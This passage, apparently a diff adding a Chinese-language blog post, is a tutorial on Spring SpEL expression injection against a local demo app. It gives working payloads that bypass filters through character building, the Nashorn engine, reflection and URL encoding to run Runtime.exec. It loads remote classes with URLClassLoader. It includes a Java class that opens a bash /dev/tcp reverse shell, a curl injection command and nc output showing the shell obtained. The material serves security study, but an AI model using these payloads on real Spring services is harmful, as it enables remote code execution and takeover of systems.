class="hljs-number">99</span>&#125;)).start()<br> <br><span class="hljs-comment">// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part2</span><br><span class="hljs-comment">// byte数组内容的生成后面有脚本</span><br>T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(<span class="hljs-number">99</span>).concat(T(java.lang.Character).toString(<span class="hljs-number">97</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">108</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">99</span>)))<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-4-2-JavaScript-Engine-Bypass"><a href="#3-4-2-JavaScript-Engine-Bypass" class="headerlink" title="3.4.2 JavaScript Engine Bypass"></a>3.4.2 JavaScript Engine Bypass</h3><p>使用 JS 引擎进行绕过</p>
+<p>获取所有 JS 引擎信息</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.JSBypass;<br><br><span class="hljs-keyword">import</span> javax.script.ScriptEngineFactory;<br><span class="hljs-keyword">import</span> javax.script.ScriptEngineManager;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">ScriptEngineManager</span> <span class="hljs-variable">scriptEngineManager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ScriptEngineManager</span>();<br>        List&lt;ScriptEngineFactory&gt; factories = scriptEngineManager.getEngineFactories();<br>        <span class="hljs-keyword">for</span> (ScriptEngineFactory factory : factories) &#123;<br>            System.out.printf(<br>                    <span class="hljs-string">&quot;Name: %s%n&quot;</span> + <span class="hljs-string">&quot;Version: %s%n&quot;</span> + <span class="hljs-string">&quot;Language name: %s%n&quot;</span> +<br>                            <span class="hljs-string">&quot;Language version: %s%n&quot;</span> +<br>                            <span class="hljs-string">&quot;Extensions: %s%n&quot;</span> +<br>                            <span class="hljs-string">&quot;Mime types: %s%n&quot;</span> +<br>                            <span class="hljs-string">&quot;Names: %s%n&quot;</span>,<br>                    factory.getEngineName(),<br>                    factory.getEngineVersion(),<br>                    factory.getLanguageName(),<br>                    factory.getLanguageVersion(),<br>                    factory.getExtensions(),<br>                    factory.getMimeTypes(),<br>                    factory.getNames()<br>            );<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210329.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>通过结果中的 Names，我们知道了所有的 js 引擎名称故 <code>getEngineByName</code> 的参数可以填 <code>[nashorn, Nashorn, js, JS, JavaScript, javascript, ECMAScript, ecmascript]</code>,举个例子:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ScriptEngineManager</span> <span class="hljs-variable">sem</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ScriptEngineManager</span>();<br><span class="hljs-type">ScriptEngine</span> <span class="hljs-variable">engine</span> <span class="hljs-operator">=</span> sem.getEngineByName(<span class="hljs-string">&quot;nashorn&quot;</span>);<br>System.out.println(engine.eval(<span class="hljs-string">&quot;2+1&quot;</span>));<br></code></pre></td></tr></table></figure>
+
+
+
+<p>payload:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// JavaScript引擎通用PoC</span><br>T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="hljs-string">&quot;nashorn&quot;</span>).eval(<span class="hljs-string">&quot;s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/C&#x27;;s[2]=&#x27;calc&#x27;;java.la&quot;</span>+<span class="hljs-string">&quot;ng.Run&quot;</span>+<span class="hljs-string">&quot;time.getRu&quot;</span>+<span class="hljs-string">&quot;ntime().ex&quot;</span>+<span class="hljs-string">&quot;ec(s);&quot;</span>)<br>  <br><span class="hljs-comment">// JavaScript引擎+反射调用</span><br>T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="hljs-string">&quot;JavaScript&quot;</span>).eval(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;ex&quot;</span>+<span class="hljs-string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRu&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)),<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/C&quot;</span>,<span class="hljs-string">&quot;calc&quot;</span>&#125;)),)<br> <br><span class="hljs-comment">// JavaScript引擎+URL编码</span><br><span class="hljs-comment">// 其中URL编码内容为：</span><br><span class="hljs-comment">// 不加最后的getInputStream()也行，因为弹计算器不需要回显</span><br>T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="hljs-string">&quot;JavaScript&quot;</span>).eval(T(java.net.URLDecoder).decode(<span class="hljs-string">&quot;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29&quot;</span>)),)<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.JSBypass;<br><br><span class="hljs-keyword">import</span> org.springframework.expression.Expression;<br><span class="hljs-keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//String spel = &quot;T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\&quot;nashorn\&quot;).eval(\&quot;s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/C&#x27;;s[2]=&#x27;calc&#x27;;java.la\&quot;+\&quot;ng.Run\&quot;+\&quot;time.getRu\&quot;+\&quot;ntime().ex\&quot;+\&quot;ec(s);\&quot;)\n&quot;;</span><br><br>        <span class="hljs-comment">//String spel = &quot;T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;ex\&quot;+\&quot;ec\&quot;,T(String[])).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;getRu\&quot;+\&quot;ntime\&quot;).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;)),new String[]&#123;\&quot;cmd\&quot;,\&quot;/C\&quot;,\&quot;calc\&quot;&#125;)),)\n&quot;;</span><br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">spel</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(T(java.net.URLDecoder).decode(\&quot;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29\&quot;)),)&quot;</span>;<br>        <span class="hljs-type">SpelExpressionParser</span> <span class="hljs-variable">spelExpressionParser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>        <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> spelExpressionParser.parseExpression(spel);<br>        System.out.println(expression.getValue());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210399.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="3-5-通过类加载器构造-PoC-Bypass"><a href="#3-5-通过类加载器构造-PoC-Bypass" class="headerlink" title="3.5  通过类加载器构造 PoC &amp; Bypass"></a>3.5  通过类加载器构造 PoC &amp; Bypass</h2><h3 id="3-5-1-UrlClassloader"><a href="#3-5-1-UrlClassloader" class="headerlink" title="3.5.1 UrlClassloader"></a>3.5.1 UrlClassloader</h3><p>这个方法就是通过远程类加载</p>
+<h4 id="Windons"><a href="#Windons" class="headerlink" title="Windons:"></a>Windons:</h4><p>目标：现在有一个 Spring Boot 服务，它的 <code>/eval?exp=</code> 路径下可以进行 SpEL 表达式注入，我们要通过注入构造 <code>URLClassLoader</code> 来远程加载类 <code>http://127.0.0.1:8999/Exp.jar</code> 达到执行恶意类的目的</p>
+<p>1） 首先构造一个恶意类</p>
+<p>弹出计算器</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Exp</span><span class="hljs-params">(String p)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;cmd /c start calc.exe&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>2） 编译打包为 Exp.jar</p>
+<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs fortran">javac <span class="hljs-built_in">Exp</span>.java<br>jar cvf <span class="hljs-built_in">Exp</span>.jar <span class="hljs-built_in">Exp</span>.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210485.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>3） 用 python 本地启动 http  服务</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> -m http.server <span class="hljs-number">8999</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210385.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p> 4） 准备 Spring Boot SpEL 漏洞 Demo  </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo.urlClassloader;<br><br><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<br><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;<br><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoApplication</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        SpringApplication.run(DemoApplication.class, args);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">package</span> com.example.demo.urlClassloader;<br><br><span class="hljs-keyword">import</span> org.springframework.expression.*;<br><span class="hljs-keyword">import</span> org.springframework.expression.spel.standard.*;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvalController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/eval&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">eval</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String exp)</span> &#123;<br>        <span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>        <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parser.parseExpression(exp);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> expression.getValue();<br>        <span class="hljs-keyword">return</span> String.valueOf(result);<br>    &#125;<br>&#125;<br>&lt;project xmlns=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br>		 xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br>		 xsi:schemaLocation=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0</span><br><span class="hljs-string">         https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;<br>	&lt;modelVersion&gt;<span class="hljs-number">4.0</span><span class="hljs-number">.0</span>&lt;/modelVersion&gt;<br>	<br>	&lt;groupId&gt;com.test&lt;/groupId&gt;<br>	&lt;artifactId&gt;demo&lt;/artifactId&gt;<br>	&lt;version&gt;<span class="hljs-number">1.0</span>&lt;/version&gt;<br>	&lt;packaging&gt;jar&lt;/packaging&gt;<br>	<br>	&lt;parent&gt;<br>		&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;<br>		&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;<br>		&lt;version&gt;<span class="hljs-number">2.3</span><span class="hljs-number">.12</span>.RELEASE&lt;/version&gt;<br>	&lt;/parent&gt;<br>	<br>	&lt;dependencies&gt;<br>		&lt;dependency&gt;<br>			&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;<br>			&lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;<br>		&lt;/dependency&gt;<br>	&lt;/dependencies&gt;<br><br>&lt;/project&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210844.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>5）做完准备工作，我们就可以构造 payload 进行测试了</p>
+<p>原始 payload：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URLClassLoader(<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL(<span class="hljs-string">&quot;http://127.0.0.1:8999/Exp.jar&quot;</span>)&#125;<br>    ).loadClass(<span class="hljs-string">&quot;Exp&quot;</span>).getConstructors()[<span class="hljs-number">0</span>].newInstance(<span class="hljs-string">&quot;aaa&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>如果直接注入：</p>
+<p>内容就会被 Tomcat 拦截， 从 <strong>Tomcat 8.5+ &#x2F; 9+</strong> 开始， <code>{ } [ ] ( ) &quot; . </code> 这些字符如果未编码 <strong>会直接被拒绝</strong>。  </p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171210844.png" srcset="/img/loading.gif" lazyload></p>
+<p>对 payload 进行 URL 编码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span>%20java.net.URLClassLoader(<br>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%20new%20java.net.URL%5B%<span class="hljs-number">5D</span>%7Bnew%20java.net.URL(%22http%3A%<span class="hljs-number">2F</span>%2F127<span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>%3A8999%2FExp.jar%<span class="hljs-number">22</span>)%<span class="hljs-number">7D</span><br>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>).loadClass(%22Exp%<span class="hljs-number">22</span>).getConstructors()%5B0%<span class="hljs-number">5D</span>.newInstance(%22aaa%<span class="hljs-number">22</span>)<br></code></pre></td></tr></table></figure>
+
+
+
+<p>编码之后再进行注入，就可以弹出计算器了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171211140.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux:"></a>Linux:</h4><p>1） 先准备恶意类并编译</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Exp</span><span class="hljs-params">(String address)</span>&#123;<br>        address = address.replace(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;/&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<br>                    <span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<br>                    <span class="hljs-string">&quot;exec 5&lt;&gt;/dev/tcp/&quot;</span> + address + <span class="hljs-string">&quot;; cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span><br>        );<br>            p.start();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/52403351/1763347727567-4de57c46-67e3-4fd3-8abb-6d99a6478d3b.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>2）借用 Windows 中写好的 SpringBoot 项目启动漏洞 Demo</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar demo-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.jar<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171211770.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>3）启动本地 http 服务</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171211478.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>4）nc 监听 2333 端口</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171211117.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>5）传入恶意 payload</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">curl -G <span class="hljs-string">&quot;http://127.0.0.1:8876/eval&quot;</span> --data-urlencode &#x27;<span class="hljs-built_in">exp</span>=T(java.net.URLClassLoader).newInstance(<span class="hljs-built_in">new</span> java.net.URL[]&#123;<span class="hljs-built_in">new</span> java.net.URL(<span class="hljs-string">&quot;http://127.0.0.1:8999/Exp.jar&quot;</span>)&#125;).loadClass(<span class="hljs-string">&quot;Exp&quot;</span>).getConstructors()[<span class="hljs-number">0</span>].newInstance(<span class="hljs-string">&quot;127.0.0.1:2333&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>6）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171211346.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>connect to [127.0.0.1] from localhost [127.0.0.1] 48096</p>
+<ul>
+<li>有一个进程从 <strong>本地（localhost）</strong></li>
+<li>使用随机端口 <strong>48096</strong></li>
+<li>连接到了监听端口 <strong>2333</strong></li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171211129.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>如图，nc 已经获取到反弹 shell</p>
+<p>可以执行命令</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171211129.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="3-5-2-AppClassLoader"><a href="#3-5-2-AppClassLoader" class="headerlink" title="3.5.2 AppClassLoader"></a>3.5.2 AppClassLoader</h3><p> 利用 SpEL，直接用 AppClassLoader 加载本地已经存在的 class，并调用里面的代码。无需远程 URL</p>
+<p>首先 <code>T(java.lang.ClassLoader)</code>获取 <code>ClassLoader</code> 类这个 Class 对象</p>
+<p><code>T(java.lang.ClassLoader).getSystemClassLoader()</code>获取系统类加载器，即 <code>AppClassLoader</code>，接着加载<code>AppClassLoader</code>中的一个类<code>loadClass(&#39;java.lang.Runtime&#39;)</code>，调用<code>getRuntime()</code>执行命令<code>exec(&#39;calc&#39;)</code>。</p>
+<p><code>AppClassLoader</code>和<code>URLClassLoader</code>的区别在于<code>AppClassLoader</code>加载的是本机 classpath 的类，本地攻击无需远程 URL；<code>URLClassLoader</code>可以加载任意 URL 的类，用于远程加载恶意类。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.addClassLoader;<br><br><span class="hljs-keyword">import</span> org.springframework.expression.Expression;<br><span class="hljs-keyword">import</span> org.springframework.expression.ExpressionParser;<br><span class="hljs-keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmdStr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;T(java.lang.ClassLoader).getSystemClassLoader().loadClass(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>;<br>        <span class="hljs-comment">//创建解析器    </span><br>        <span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>        <span class="hljs-comment">//解析表达式</span><br>        <span class="hljs-type">Expression</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> parser.parseExpression(cmdStr);<br>        <span class="hljs-comment">//弹出计算器</span><br>        System.out.println(exp.getValue());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171211750.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p>SpEL（Spring表达语言）表达式详述：</p>
+<p><a target="_blank" rel="noopener" href="https://javacfox.github.io/2019/07/04/SpEL%EF%BC%88Spring%E8%A1%A8%E8%BE%BE%E8%AF%AD%E8%A8%80%EF%BC%89%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AF%A6%E8%BF%B0/">https://javacfox.github.io/2019/07/04/SpEL%EF%BC%88Spring%E8%A1%A8%E8%BE%BE%E8%AF%AD%E8%A8%80%EF%BC%89%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AF%A6%E8%BF%B0/</a></p>
+<p>SpEL表达式：</p>
+<p><a target="_blank" rel="noopener" href="https://mrbird.cc/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F.html">https://mrbird.cc/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F.html</a></p>
